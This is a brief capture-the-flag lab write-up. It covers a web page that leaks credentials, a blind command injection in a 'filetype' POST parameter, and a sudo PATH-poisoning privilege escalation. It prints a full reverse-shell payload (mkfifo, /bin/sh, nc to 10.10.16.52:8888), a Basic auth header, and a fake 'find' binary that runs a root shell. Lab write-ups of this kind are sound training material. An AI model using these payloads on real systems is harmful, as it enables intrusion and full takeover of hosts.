Login credentials were hidden in a url in the source code of the web page.

Blind command injection in the _filetype_ parameter of the post request for downloading the picture:
```
photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;+rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.52+8888+>/tmp/f;&dimensions=10x10
```
with the header:
`Authorization: Basic cEgwdDA6YjBNYiE=`

This spawned a shell in my listener and I got the user flag.

### Privesc
It had to do with the _cleanup.sh_ file. However I found the flag in a /tmp/test/root.txt, so I am not quite sure how it worked, but I am trying to figure it out:

It is definitely that I must create a different _cat_ file with malicious code, and place it in a _PATH_ with _/bin/_


_With SETENV, you allow the user to control the environment for the privileged process, without any restrictions whatsoever_

It was indeed path poisoning:
1. create a _find_ file in _/tmp_ with the contents
`/bin/bash -p`
2. `sudo PATH=/tmp:$PATH /opt/cleanup.sh`
root shell:)